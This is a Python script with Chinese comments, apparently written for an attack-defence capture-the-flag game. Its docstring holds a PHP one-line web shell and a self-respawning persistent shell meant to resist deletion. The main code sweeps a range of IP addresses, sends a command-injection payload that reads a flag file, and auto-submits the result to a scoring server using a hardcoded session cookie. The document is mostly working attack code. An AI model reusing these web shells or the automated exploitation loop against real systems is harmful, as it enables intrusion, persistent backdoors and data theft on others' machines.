#coding:utf-8

"""
一句话木马内容  shell.php
<?php
$seck=$_POST['seck'];
$box=@eval($seck);
echo system($seck);
?>

getFlag.php
<?php
echo "9ca23c48490e04b5a6378d8190909df77318c891";
?>

使用内存马
<?php
ignore_user_abort(true);
set_time_limit(0);
$file = "veneno.php";
$shell = "<?php eval(\$_POST[venenohi]);?>";
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, $shell);
}
usleep(50);
}
?>

在本目录下生成veneno.php 一句话木马然后权限设置一下，别人就一直删不掉

使用一些加密的shell  防止别人利用我们的木马


这样能读取flag
再配合自己登陆提交的页面
使用自己cookie
自动提交flag

#coding:utf-8
import requests
import time
url2="http://40.10.10.{ip}/index.php"
header={
    "User-Agent":"test"
}
# whiteList={21,23,24,33,20,45,50}
whiteList={}
while 1:
    for i in xrange(1,255):
        if i not in whiteList:
            tmp2=url2.format(ip=str(i))
            print tmp2
            time.sleep(3)


"""
import requests , os,time
header={
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
"Accept-Encoding": "gzip, deflate",
"Connection": "keep-alive",
"Content-Type": "application/x-www-form-urlencoded",
# "Content-Length": "22",
}
num=21
while 1:
    try:
        url = "http://40.10.10.%s/index.php?s=/weibo/index/index.html" % (num)
        print url
        data={
            "welcome":"system('cat /home/flag');"
        }
        res=requests.post(url=url,headers=header,data=data,timeout=2)
        box = res.content
        # print box
        if len(box) >0:
            print box[0:84]
            geturl="http://192.168.100.100/home/match/result/"
            hds={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "http://192.168.100.100/home/match/detail/11/69",
            "Cookie": "laravel_session=eyJpdiI6IjZTK3Njcm1vUFhOQXkwSUxFM1wvUm9nPT0iLCJ2YWx1ZSI6IjZiTVwvcDVJdkNhWktsWm1FY1FYYkdFQzRodDJLTzdiR1VKREdudWN4ejRjd25YZHRKNDA0c1dkVGg1Q1wvWGVmVnB3SXBxTCsxc0N1U0lDXC9xXC9hRlFvdz09IiwibWFjIjoiYjFkZTEyZjgwNzI5YjQ1ZDZkMGIzOTQ1ODFlOTMwZWFmNjYzY2MyNjc4MzdlNjE5NmM5ODdjMjc2NGRlNmUxYSJ9; time=2017-5-13%208%3A32%3A14; io=USx3RA5ITIhZXYnPAAbV"
            }
            data="teamId=69&matchId=11&flag=%s" % box[0:84]
            getFlag=requests.post(geturl, data=data, headers=hds).content
            print getFlag
            num=num+1
            if num>=70:
                num=20
                break
            time.sleep(2)
            continue
        else :
            num=num+1
            continue
    except Exception,e:
        print u"目标不存在"
        num=num+1
        print num



